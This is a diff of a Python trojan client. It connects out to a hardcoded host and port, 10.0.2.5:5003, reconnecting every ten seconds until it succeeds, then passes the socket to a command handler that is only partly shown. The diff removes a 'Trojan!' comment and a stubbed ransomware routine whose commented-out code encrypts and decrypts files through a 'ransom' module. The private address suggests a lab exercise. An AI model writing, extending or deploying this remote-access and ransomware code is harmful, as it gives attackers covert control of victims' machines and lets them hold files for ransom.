@@ -9,14 +9,13 @@ import time
 
 # SERVER_HOST = "127.0.0.1"
 SERVER_HOST = "10.0.2.5"
-# SERVER_HOST = sys.argv[1]
+
 SERVER_PORT = 5003
 BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
 # separator string for sending 2 messages in one go
 SEPARATOR = "<sep>"
 
 def autoconn():
-    # print("Trojan!")
     try:
         s = socket.socket()
         s.connect((SERVER_HOST, SERVER_PORT))
@@ -29,19 +28,6 @@ def autoconn():
         time.sleep(10)
         autoconn()
     cmds(s)
-    
-def ransomProc(cmd):
-    # output = ""
-    # if cmd[0].lower() == "e":
-    #     key, salt = ransom.generate_key(cmd[2])
-    #     output = ransom.enc_det(cmd[1], key)
-    # elif cmd[0].lower() == "d":
-    #     key, salt = ransom.generate_key(cmd[2], load_existing_salt=True)
-    #     output = ransom.dec_det(cmd[1], key)
-    # else:
-    #     pass
-    # return output
-    pass
 
 def cmds(s):
     term = False
